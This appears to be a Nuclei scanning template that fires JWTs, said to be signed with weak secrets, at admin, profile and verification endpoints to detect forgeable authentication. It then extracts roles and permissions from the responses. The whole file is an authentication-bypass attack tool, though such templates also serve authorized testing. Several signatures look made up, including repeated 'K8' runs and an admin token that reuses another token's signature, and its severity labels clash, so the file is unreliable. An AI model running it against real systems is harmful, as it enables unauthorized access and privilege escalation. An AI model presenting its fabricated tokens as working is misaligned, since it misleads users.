id: medium-webapp-weak-jwt-secret-brute-force

info:
  name: Weak JWT Secret Brute Force
  author: elite-red-team
  severity: high
  description: |
    Detects JWT tokens that use weak or common secrets that can be brute-forced.
    This vulnerability allows attackers to forge valid JWT tokens and potentially
    gain unauthorized access to protected resources or escalate privileges.
  reference:
    - https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/
    - https://tools.ietf.org/html/rfc7519
    - https://github.com/ticarpi/jwt_tool
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-521
  tags: jwt,weak-secret,brute-force,authentication,medium

http:
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{jwt_token}}

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Authorization: Bearer {{jwt_token}}
        
        {"test": "data"}

      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        Cookie: token={{jwt_token}}

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        token={{jwt_token}}&action=verify

    payloads:
      path:
        - "/api/user"
        - "/api/profile"
        - "/api/admin"
        - "/dashboard"
        - "/admin"
        - "/user"
        - "/profile"
        - "/api/verify"
        - "/auth/verify"
        - "/token/verify"

      jwt_token:
        # Weak secret: "secret"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        # Weak secret: "password"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.Gf7leJ8i30LmMI7GBTpWDMXV2OH4PmBV4CIk6dVhgs4"
        # Weak secret: "123456"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.hw6QJM8QHXbJsVpKvgQtOldlSeU3BQBQ6LiMJu_vx7s"
        # Weak secret: "admin"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.VG6T5K1zNdKqjhSyKG2hzTqj8XpjqwXk5V6T5K1zNdK"
        # Weak secret: "key"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ"
        # Weak secret: "test"
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.Zn7K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8K8"
        # Admin role with weak secret
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    attack: clusterbomb
    threads: 8

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 302

      - type: word
        words:
          - "unauthorized"
          - "invalid token"
          - "token expired"
          - "forbidden"
          - "access denied"
        condition: or
        negative: true
        case-insensitive: true

      - type: word
        words:
          - "welcome"
          - "dashboard"
          - "profile"
          - "user"
          - "admin"
          - "success"
          - "authenticated"
        condition: or
        case-insensitive: true

    extractors:
      - type: regex
        name: jwt_response
        regex:
          - '(?i)(welcome|authenticated|success)'
          - '(?i)(admin|user|profile)'

      - type: regex
        name: role_extraction
        regex:
          - '(?i)role["\']?\s*[:=]\s*["\']?([^"\'<>\s]+)'
          - '(?i)permission["\']?\s*[:=]\s*["\']?([^"\'<>\s]+)'

# Test for JWT in different locations
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        X-Auth-Token: {{jwt_token}}

      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-JWT-Token: {{jwt_token}}
        
        {}

    payloads:
      path:
        - "/api/protected"
        - "/api/secure"
        - "/protected"
        - "/secure"

      jwt_token:
        # More weak secrets
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o"

    attack: clusterbomb

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "protected"
          - "secure"
          - "authorized"
        condition: or
        case-insensitive: true

    extractors:
      - type: regex
        name: protected_content
        regex:
          - '(?i)(protected|secure|authorized)'

# Test for JWT verification endpoint
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        
        {"token": "{{jwt_token}}"}

    payloads:
      path:
        - "/api/auth/verify"
        - "/auth/verify"
        - "/verify"
        - "/token/verify"

      jwt_token:
        - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    attack: clusterbomb

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "valid"
          - "verified"
          - "true"
        condition: or
        case-insensitive: true

    extractors:
      - type: regex
        name: verification_response
        regex:
          - '(?i)(valid|verified|true)'